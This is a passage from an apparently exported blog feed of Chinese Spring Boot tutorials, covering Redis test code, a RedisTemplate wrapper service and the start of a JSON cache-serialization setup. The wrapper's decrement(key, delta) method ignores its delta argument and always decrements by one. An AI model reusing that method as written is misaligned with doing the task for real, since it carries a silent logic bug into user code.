        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${springboot.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${junit.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Assert</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span>runner<span class="token punctuation">.</span></span><span class="token class-name">RunWith</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">SpringBootTest</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">RedisTemplate</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ActiveProfiles</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">TestPropertySource</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>test<span class="token punctuation">.</span>context<span class="token punctuation">.</span>junit4<span class="token punctuation">.</span></span><span class="token class-name">SpringRunner</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Resource</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RunWith</span><span class="token punctuation">(</span><span class="token class-name">SpringRunner</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@SpringBootTest</span><span class="token punctuation">(</span>classes <span class="token operator">=</span> <span class="token class-name">DatabaseApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@ActiveProfiles</span><span class="token punctuation">(</span><span class="token string">"dev"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@TestPropertySource</span><span class="token punctuation">(</span>
        properties <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">"server.port=80"</span><span class="token punctuation">,</span>
                <span class="token string">"spring.application.name=configuration"</span><span class="token punctuation">,</span>
                <span class="token string">"spring.cloud.nacos.config.server-addr=native.virtual.com:8848"</span><span class="token punctuation">,</span>
                <span class="token string">"spring.cloud.nacos.config.file-extension=yml"</span><span class="token punctuation">,</span>
                <span class="token string">"spring.cloud.nacos.config.namespace=learn-dev"</span><span class="token punctuation">,</span>
                <span class="token string">"spring.cloud.nacos.config.group=DEFAULT_GROUP"</span><span class="token punctuation">,</span>
                <span class="token string">"spring.cloud.nacos.config.extension-configs[0].data-id=redis.yml"</span><span class="token punctuation">,</span>
                <span class="token string">"spring.cloud.nacos.config.extension-configs[0].refresh=true"</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DatabaseApplicationTests</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Resource</span>
    <span class="token keyword">private</span> <span class="token class-name">RedisTemplate</span> redisTemplate<span class="token punctuation">;</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testRedisConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        redisTemplate<span class="token punctuation">.</span><span class="token function">opsForList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">leftPush</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        redisTemplate<span class="token punctuation">.</span><span class="token function">opsForList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">leftPush</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        redisTemplate<span class="token punctuation">.</span><span class="token function">opsForList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">leftPush</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">,</span> <span class="token string">"333"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">assertTrue</span><span class="token punctuation">(</span><span class="token string">"111"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>redisTemplate<span class="token punctuation">.</span><span class="token function">opsForList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rightPop</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">assertTrue</span><span class="token punctuation">(</span>redisTemplate<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h2 id="基于RedisTemplate-Lettuce数据类封装">基于RedisTemplate+Lettuce数据类封装</h2>
<p>原文：<a href="https://pdai.tech/md/spring/springboot/springboot-x-redis-lettuce-wrap.html">https://pdai.tech/md/spring/springboot/springboot-x-redis-lettuce-wrap.html</a></p>
<blockquote>
<p>RedisTemplate中的操作和方法众多，为了程序保持方法使用的一致性，屏蔽一些无关的方法以及对使用的方法进一步封装。</p>
</blockquote>
<ol>
<li>
<p>RedisService接口类</p>
 <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>data<span class="token punctuation">.</span>redis<span class="token punctuation">.</span>core<span class="token punctuation">.</span></span><span class="token class-name">RedisCallback</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collection</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">IRedisService</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>

    <span class="token keyword">void</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token class-name">T</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">void</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token class-name">T</span> value<span class="token punctuation">,</span> <span class="token keyword">long</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">T</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token class-name">Collection</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> keys<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">boolean</span> <span class="token function">expire</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token keyword">long</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">Long</span> <span class="token function">getExpire</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">boolean</span> <span class="token function">hasKey</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">Long</span> <span class="token function">increment</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token keyword">long</span> delta<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">Long</span> <span class="token function">decrement</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token keyword">long</span> delta<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">void</span> <span class="token function">addSet</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token class-name">T</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token function">getSet</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">void</span> <span class="token function">deleteSet</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token class-name">T</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token class-name">T</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token class-name">RedisCallback</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> redisCallback<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>RedisService的实现类</p>
 <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">import com.local.service.IRedisService;
import org.springframework.data.redis.core.RedisCallback;
import org.springframework.data.redis.core.RedisTemplate;

import javax.annotation.Resource;
import java.util.Collection;
import java.util.Set;
import java.util.concurrent.TimeUnit;

public class RedisServiceImpl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>T</span><span class="token punctuation">&gt;</span></span> implements IRedisService<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>T</span><span class="token punctuation">&gt;</span></span> {

    @Resource(name = "redisTemplate")
    private RedisTemplate<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>String,</span> <span class="token attr-name">T</span><span class="token punctuation">&gt;</span></span> redisTemplate;

    @Override
    public void set(String key, T value, long time) {
        redisTemplate.opsForValue().set(key, value, time, TimeUnit.SECONDS);
    }

    @Override
    public void set(String key, T value) {
        redisTemplate.opsForValue().set(key, value);
    }

    @Override
    public T get(String key) {
        return redisTemplate.opsForValue().get(key);
    }

    @Override
    public void delete(String key) {
        redisTemplate.delete(key);
    }

    @Override
    public void delete(Collection<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>String</span><span class="token punctuation">&gt;</span></span> keys) {
        redisTemplate.delete(keys);
    }

    @Override
    public boolean expire(String key, long time) {
        return redisTemplate.expire(key, time, TimeUnit.SECONDS);
    }

    @Override
    public Long getExpire(String key) {
        return redisTemplate.getExpire(key, TimeUnit.SECONDS);
    }

    @Override
    public boolean hasKey(String key) {
        return redisTemplate.hasKey(key);
    }

    @Override
    public Long increment(String key, long delta) {
        return redisTemplate.opsForValue().increment(key, delta);
    }

    @Override
    public Long decrement(String key, long delta) {
        return redisTemplate.opsForValue().decrement(key);
    }

    @Override
    public void addSet(String key, T value) {
        redisTemplate.opsForSet().add(key, value);
    }

    @Override
    public Set<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>T</span><span class="token punctuation">&gt;</span></span> getSet(String key) {
        return redisTemplate.opsForSet().members(key);
    }

    @Override
    public void deleteSet(String key, T value) {
        redisTemplate.opsForSet().remove(key, value);
    }

    @Override
    public T execute(RedisCallback<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>T</span><span class="token punctuation">&gt;</span></span> redisCallback) {
        return redisTemplate.execute(redisCallback);
    }
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>配置 序列化成JSON字符串.md</title>
    <url>/20221102/3fb18050.html</url>
    <content><![CDATA[<p>当我们使用<code>@Cacheable</code>注解的时候会将返回的对象缓存起来，我们会发现默认缓存的值是二进制的，不方便查看，为此我们自定义序列化配置，改成JSON格式的</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
    <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.cjs.example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>cjs-springsecurity-example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>0.0.1-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>packaging</span><span class="token punctuation">&gt;</span></span>jar<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>packaging</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>cjs-springsecurity-example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-parent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.0.2.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>relativePath</span><span class="token punctuation">/&gt;</span></span> <span class="token comment">&lt;!-- lookup parent from repository --&gt;</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>


    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-cache<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-data-redis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
        
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.projectlombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>lombok<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>optional</span><span class="token punctuation">&gt;</span></span>true<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>optional</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-starter-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.security<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-security-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>build</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugins</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spring-boot-maven-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugins</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>build</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Bean</span>
<span class="token keyword">public</span> <span class="token class-name">RedisCacheManager</span> <span class="token function">redisCacheManager</span><span class="token punctuation">(</span><span class="token class-name">RedisTemplate</span> redisTemplate<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">RedisCacheWriter</span> redisCacheWriter <span class="token operator">=</span> <span class="token class-name">RedisCacheWriter</span><span class="token punctuation">.</span><span class="token function">nonLockingRedisCacheWriter</span><span class="token punctuation">(</span>
            redisTemplate<span class="token punctuation">.</span><span class="token function">getConnectionFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">RedisCacheConfiguration</span> redisCacheConfiguration <span class="token operator">=</span> <span class="token class-name">RedisCacheConfiguration</span><span class="token punctuation">.</span><span class="token function">defaultCacheConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">serializeValuesWith</span><span class="token punctuation">(</span>
